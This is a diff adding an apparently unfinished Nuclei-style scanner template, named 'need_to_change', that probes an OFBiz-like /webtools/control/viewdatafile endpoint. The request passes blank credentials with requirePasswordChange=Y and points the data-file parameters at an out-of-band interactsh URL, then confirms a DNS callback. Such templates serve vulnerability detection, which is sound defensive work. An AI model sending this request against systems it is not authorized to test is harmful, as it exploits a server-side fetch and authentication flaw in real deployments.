@@ -1,0 +1,25 @@
+id: need_to_change
+
+info:
+  name: need_to_change
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        GET /webtools/control/viewdatafile?DEFINITION_LOCATION=http%3A%2F%2F{{interactsh-url}}&DEFINITION_IS_URL=on&DEFINITION_NAME=&DATAFILE_LOCATION=http%3A%2F%2F{{interactsh-url}}&DATAFILE_IS_URL=on&DATAFILE_SAVE=123&ENTITYXML_FILE_SAVE=&USERNAME=&PASSWORD=s&requirePasswordChange=Y HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
